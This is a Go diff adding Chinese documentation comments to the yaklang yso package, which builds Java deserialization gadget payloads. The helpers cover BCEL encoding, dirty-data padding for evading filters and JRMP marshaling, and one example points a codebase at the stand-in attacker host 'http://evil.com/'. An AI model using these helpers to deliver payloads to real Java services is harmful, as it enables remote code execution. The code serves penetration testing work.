@@ -5,14 +5,15 @@ import (
 	"bytes"
 	"errors"
 	"fmt"
+	"reflect"
+	"runtime"
+	"strings"
+
 	"github.com/yaklang/yaklang/common/javaclassparser"
 	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yserx"
-	"reflect"
-	"runtime"
-	"strings"
 )
 
 type GadgetFunc func(cmd string) (yserx.JavaSerializable, error)
@@ -28,6 +29,13 @@ type JavaStruct struct {
 	BlockData   []*JavaStruct
 }
 
+// GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。
+// 函数名需要符合 "Get*JavaObject" 格式，返回中间的 * 部分作为 gadget 名称
+// Example:
+// ```
+// name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
+// // name = "CommonsBeanutils1"
+// ```
 func GetGadgetNameByFun(i interface{}) (string, error) {
 	name := runtime.FuncForPC(reflect.ValueOf(i).Pointer()).Name()
 	if strings.Contains(name, ".") {
@@ -486,6 +494,12 @@ func _WalkJavaSerializableObject(objSer yserx.JavaSerializable, replace func(new
 	return
 }
 
+// ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串
+// Example:
+// ```
+// classObj := &javaclassparser.ClassObject{...}
+// bcelStr, err := yso.ToBcel(classObj)
+// ```
 func ToBcel(i interface{}) (string, error) {
 	switch ret := i.(type) {
 	case *javaclassparser.ClassObject:
@@ -518,11 +532,24 @@ func ToBytes(i interface{}, opts ...MarshalOptionFun) ([]byte, error) {
 
 type MarshalOptionFun func(ctx *yserx.MarshalContext)
 
+// SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度
+// length: 要设置的脏数据长度
+// Example:
+// ```
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
+// ```
 func SetToBytesDirtyDataLength(length int) MarshalOptionFun {
 	return func(ctx *yserx.MarshalContext) {
 		ctx.DirtyDataLength = length
 	}
 }
+
+// SetToBytesJRMPMarshalerWithCodeBase 设置JRMP序列化时的CodeBase
+// cb: 要设置的CodeBase字符串
+// Example:
+// ```
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.SetToBytesJRMPMarshalerWithCodeBase("http://evil.com/"))
+// ```
 func SetToBytesJRMPMarshalerWithCodeBase(cb string) MarshalOptionFun {
 	return func(ctx *yserx.MarshalContext) {
 		ctx.JavaMarshaler = &yserx.JRMPMarshaler{
@@ -530,19 +557,37 @@ func SetToBytesJRMPMarshalerWithCodeBase(cb string) MarshalOptionFun {
 		}
 	}
 }
+
+// SetToBytesJRMPMarshaler 设置使用JRMP序列化器
+// Example:
+// ```
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.SetToBytesJRMPMarshaler())
+// ```
 func SetToBytesJRMPMarshaler() MarshalOptionFun {
 	return func(ctx *yserx.MarshalContext) {
 		ctx.JavaMarshaler = &yserx.JRMPMarshaler{}
 	}
 }
-func SetToBytesThreeBytesString() MarshalOptionFun {
-	return func(ctx *yserx.MarshalContext) {
-		ctx.StringCharLength = 3
-	}
-}
+
+// SetToBytesTwoBytesString 设置序列化时使用双字节字符串
+// Example:
+// ```
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.twoBytesCharString())
+// ```
 func SetToBytesTwoBytesString() MarshalOptionFun {
 	return func(ctx *yserx.MarshalContext) {
 		ctx.StringCharLength = 2
+	}
+}
+
+// SetToBytesThreeBytesString 设置序列化时使用三字节字符串
+// Example:
+// ```
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.threeBytesCharString())
+// ```
+func SetToBytesThreeBytesString() MarshalOptionFun {
+	return func(ctx *yserx.MarshalContext) {
+		ctx.StringCharLength = 3
 	}
 }
 
